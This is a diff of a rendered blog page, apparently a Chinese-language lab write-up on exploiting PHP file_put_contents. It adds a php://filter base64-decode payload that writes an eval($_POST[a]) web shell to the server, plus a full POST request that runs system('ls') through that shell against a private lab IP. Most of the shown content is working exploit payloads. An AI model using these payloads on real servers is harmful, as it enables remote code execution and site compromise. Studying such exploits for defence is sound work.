@@ -599,14 +599,83 @@
 </span></span><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>payload:<code>http://172.28.76.89:8845/demo0.php?content=tmppppp.php&amp;data=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p>
-<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110205729349.png"
+</div><p>payload1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">http://172.28.76.89:8845/demo0.php?content=php://filter/write=convert.base64-decode/resource=tmppppp.php<span class="p">&amp;</span>data=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110212829248.png"
 	
 	
 	
 	loading="lazy"
 	
-		alt="image-20250110205729349"
+		alt="image-20250110212829248"
+	
+	
+></p>
+<p>payload2（POST方法，给出请求包）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">POST /tmppppp.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 172.28.76.89:8845
+</span></span><span class="line"><span class="cl">Content-Length: 25
+</span></span><span class="line"><span class="cl">Pragma: no-cache
+</span></span><span class="line"><span class="cl">Cache-Control: no-cache
+</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+</span></span><span class="line"><span class="cl">Origin: http://172.28.76.89:8845
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span class="line"><span class="cl">Referer: http://172.28.76.89:8845/tmppppp.php
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9
+</span></span><span class="line"><span class="cl">Cookie: xp=MTczNjUxMzY3NHxEWDhFQVFMX2dBQUJFQUVRQUFBcF80QUFBUVp6ZEhKcGJtY01Dd0FKVTJGbVpVVnVkSEo1Qm5OMGNtbHVad3dJQUFZek1ETTNabVU9fILsAVcZsirdfcyiMx72M_Te9ogdFuvgVh_JJascAWgL
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">a=system<span class="nv">%2</span>8<span class="nv">%2</span>7ls<span class="nv">%2</span>7<span class="nv">%2</span>9<span class="nv">%3</span>B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110212906823.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110212906823"
+	
+	
+></p>
+<p><img src="https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20250110213054559.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250110213054559"
 	
 	
 ></p>
